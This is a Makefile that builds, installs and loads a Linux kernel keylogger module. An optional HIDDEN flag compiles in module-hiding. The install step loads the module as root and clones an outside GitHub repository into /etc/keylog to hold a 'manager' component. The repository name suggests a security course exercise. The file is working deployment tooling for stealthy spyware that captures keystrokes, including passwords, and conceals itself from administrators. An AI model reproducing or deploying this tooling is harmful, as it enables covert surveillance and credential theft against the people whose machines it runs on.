modname := keylog
obj-m := $(modname).o

keylog-objs := keylog.o

KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

KCPPFLAGS=""

ifdef HIDDEN
KCPPFLAGS+="-DHIDE_MODULE -DBUFLEN=2048"
endif

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	-rmmod $(modname)
	insmod $(modname).ko

unload:
	-rmmod $(modname)

install:
	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
	depmod -a
	insmod $(modname).ko
	git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
	mv manager.o /etc/keylog

uninstall:
	rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
	rmdir /lib/modules/$(KVERSION)/misc/$(modname)
	rm -rf /sys/kernel/debug/logdir
	rm -rf /etc/keylog
	depmod -a
	rmmod $(modname).ko
